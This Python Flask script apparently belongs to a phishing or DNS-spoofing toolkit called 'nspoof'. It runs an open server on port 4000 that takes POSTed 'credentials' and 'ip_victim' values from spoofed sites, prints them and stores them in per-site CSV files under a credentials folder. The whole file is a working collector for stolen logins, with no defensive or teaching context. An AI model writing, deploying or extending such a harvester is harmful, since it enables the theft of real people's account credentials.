from flask import Flask, request
import sys
import os
import pdb
import csv

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
from csveditor import update_csv_with_json

app = Flask(__name__)

file_path = os.path.abspath(__file__)
directory = os.path.dirname(file_path)

ENV['nspoof_location'] = directory + "/.."

@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE'])
def handle_request():
    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            site_id = data.get('site_id')
            credentials = data.get('credentials')
            ip_victim = data.get('ip_victim')
        else:
            site_id = request.form.get('site_id')
            credentials = request.form.get('credentials')
            ip_victim = request.form.get('ip_victim')


        print(site_id, credentials, ip_victim)
        print("----------------------------------------------")

        csv_file_path = ENV['nspoof_location'] + "/credentials/" + str(site_id) + ".csv"
        folder_path = os.path.dirname(csv_file_path)

        if not os.path.exists(folder_path):
            os.makedirs(folder_path)

        if not os.path.isfile(csv_file_path):
            with open(csv_file_path, mode='w', newline='', encoding='utf-8') as csvfile:
                writer = csv.writer(csvfile)
                writer.writerow([])  # Écrire une ligne vide pour l'entête

        update_csv_with_json(csv_file_path, credentials)
        print(credentials)

        return {}, 200

    return {}, 405

sys.stdout.flush()
app.run(host='0.0.0.0', port=4000, threaded=True)
